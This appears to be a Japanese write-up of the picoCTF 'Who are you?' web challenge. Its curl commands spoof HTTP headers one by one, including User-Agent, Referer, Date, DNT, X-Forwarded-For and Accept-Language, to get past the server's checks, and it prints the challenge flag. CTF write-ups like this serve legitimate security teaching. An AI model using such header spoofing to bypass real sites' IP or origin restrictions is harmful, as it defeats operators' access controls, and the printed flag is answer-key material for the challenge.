# Who are you?

AUTHOR: MADSTACKS

## Description

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn

Only people who use the official PicoBrowser are allowed on this site!

ヒント
> It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616

## writeup

`PicoBrwoser`ということで，User-Agentを指定してみる．

```bash
 % curl -A "PicoBrowser" http://mercury.picoctf.net:39114/
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Who are you?</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
      <div class="jumbotron">
        <p class="lead"></p>
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:red">I don&#39;t trust users visiting from another site.</h3>
                        </div>
                </div>
                <br/>

                        <img src="/static/who_r_u.gif"></img>

        </div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>
<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>% 
```

次は`I don't trust users visiting from another site.`
ときたため，refererで同じサイトから来たことを知らせます．

```bash
curl -A "PicoBrowser" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/
...
<h3 style="color:red">Sorry, this site only worked in 2018.</h3>
...
```

時間をずらす必要がありそうです．HTTP headerに`Date`属性を付与してみます．

```bash
curl -A "PicoBrowser" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT"
...
<h3 style="color:red">I don&#39;t trust users who can be tracked.</h3>
...
```

トラッキングがONになっていることが原因だということでOFFにします．

```bash
curl -A "PicoBrowser" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1"
...
<h3 style="color:red">This website is only for people from Sweden.</h3>
...
```

スウェーデンのIPアドレスのrangeを調べます．
送信元IPアドレスを付与する場合は`X-Forwarded-For`を使います([参考](X-Forwarded-For))

```bash
curl -A "PicoBrowser" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 23.92.112.1" 
...
<h3 style="color:red">You&#39;re in Sweden but you don&#39;t speak Swedish?</h3>
h3>
...
```

言語設定をスウェーデン語にします([参考1](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Accept-Language), [参考2](https://www.w3.org/International/ms-lang.html))．

```bash
curl -A "PicoBrowser" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/ -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 23.92.112.1" -H "Accept-Language:sv"
...
<div class="container">
      <div class="jumbotron">
        <p class="lead"></p>
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:green">What can I say except, you are welcome</h3>
                        </div>
                </div>
                <br/>

                        <b>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}</b>

        </div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>

...
```

## FLAG

```bash
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}
```

## 参考

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Date
- https://recruit.gmo.jp/engineer/jisedai/blog/do-not-trackdnt%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6/
- https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-Forwarded-For